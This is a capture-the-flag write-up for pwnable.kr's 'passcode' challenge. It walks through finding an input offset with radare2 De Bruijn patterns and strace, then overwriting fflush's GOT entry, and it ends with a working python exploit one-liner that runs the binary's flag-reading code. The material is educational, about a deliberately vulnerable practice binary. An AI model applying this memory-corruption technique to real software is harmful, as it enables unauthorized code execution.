## Pwnable.kr level1: passcode ##

### Prior knowledge ###
The task for this challenge was overwriting an entry in the GOT.
The link https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html gives a nice introduction into the topic of GOT and PLT.
The binary and code was given.

```
% cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");

	printf("pw1: %x, pw2: %x\n", passcode1, passcode2);
	printf("should be: pw1: %x, pw2: %x\n", 338150, 13371337);

	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

I won't go into the details of the bug.
The details of the challenge are described in http://xhyumiracle.com/pwnable-kr-passcode/.
My aim is to describe how to solve the challenge using `radare2` tools, python and strace.

### Generating patterns with radare2 ###

First, we generate a pattern using the `radare2` tools to find out at which offset of our input data the instruction pointer gets overwritten, which usually results in a seg fault if it's random data.

```
% ragg2 -P 100 -r ; echo
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
hacker@ctf:~/ctf/pwnable.kr/level1/passcode$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
enter passcode1 : 9
Segmentation fault
```

The generated input must be 100 chars, because that's the size which is read into the variable `name`.
Every char entered above this limit will be buffered until the next call of scanf.
Since the next call will expect a decimal number, we can either directly put the decimal number behind it, or enter it on the next scanf call (shown as a read `strace`).

To figure out the part of the pattern which generated the fault, we use strace, which will show the address in `$eip` which caused the segmentation fault.

```
% strace -f ./passcode
execve("./passcode", ["./passcode"], [/* 21 vars */]) = 0
[ Process PID=32335 runs in 32 bit mode. ]
...
write(1, "enter you name : ", 17enter you name : )       = 17
read(0, AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
"AAABAACAADAAEAAFAAGAAHAAIAAJAAKA"..., 1024) = 101
write(1, "Welcome AAABAACAADAAEAAFAAGAAHAA"..., 110Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
) = 110
write(1, "enter passcode1 : ", 18enter passcode1 : )      = 18
read(0, 9
"9\n", 1024)                    = 2
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x68414167} ---
+++ killed by SIGSEGV +++
Segmentation fault
```

The pattern `0x68414167` ('hAAg') generated the segfault.
Since the generated pattern is a reproducible De Bruijn Pattern, we search for the offset in the generated pattern using the `wopO` command of `radare2`. I did not find a way to use commandline tools only to find the offset out, without starting `radare2`.

```
% r2 ./passcode
[0x080484b0]> wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]   Write a De Bruijn Pattern of length 'len' at address 'addr'
| wopD* len [@ addr]  Show wx command that creates a debruijn pattern of a specific length
| wopO value          Finds the given value into a De Bruijn Pattern at current offset
[0x080484b0]> wopO 0x68414167
96
```

The data which overwrites the eip is therefore located at offset 96 of the input data.

### Overwriting the GOT entry ###

We find first where the function fflush is located in the PLT with the `r2` function `ii`, which lists all the imports, and filter for the function `fflush` using `~`.
The command `pd @addr` disassmbles the instructions at `addr`.
```
[0x080484b0]> ii~fflush
ordinal=002 plt=0x08048430 bind=GLOBAL type=FUNC name=fflush
[0x080484b0]> pd@0x08048430
/ (fcn) sym.imp.fflush 6
|   sym.imp.fflush ();
|     !!!      ; CALL XREF from 0x08048593 (sym.login)
\     |||   0x08048430      ff2504a00408   jmp dword [reloc.fflush_4]  ; 0x804a004 ; "6\x84\x04\bF\x84\x04\bV\x84\x04\bf\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b\xa6\x84\x04\b"
      !!!      ; DATA XREF from 0x08048430 (sym.imp.fflush)
```

Looking at the code at that address, we find the entry for fflush in the GOT to be located at 0x804a004.
This is where we have to overwrite the address of the real fflush function with an address which will print the flag, e.g. the address `0x080485d7` in `login()`.
The `radare2` command `pd 5 @addr` disassembles 5 instruction starting at position `addr`.

```
[0x08048410]> pd 5 @0x080485d7
|           0x080485d7      c70424a58704.  mov dword [esp], str.Login_OK_ ; [0x80487a5:4]=0x69676f4c ; "Login OK!" ; const char * s
|           0x080485de      e86dfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485e3      c70424af8704.  mov dword [esp], str._bin_cat_flag ; [0x80487af:4]=0x6e69622f ; "/bin/cat flag" ; const char * string
|           0x080485ea      e871feffff     call sym.imp.system         ; int system(const char *string)
|           0x080485ef      c9             leave

```

Here is a python snippet for writing address in little endian order, e.g. using ipython:
```
In [1]: import struct; struct.pack("<I", 0x804a004)
Out[1]: '\x04\xa0\x04\x08'
```


For our attack, we have to fill the variable `name` with 96 random chars, the GOT address which contains the address of `fflush` `0x804a004`, and write our chosen address `0x080485d7` into `passcode1`.
This can be expressed in one line:
```
% python -c "print 'A'*96+'\x04\xa0\x04\x08'+str(0x080485d7)" | ./passcode
```
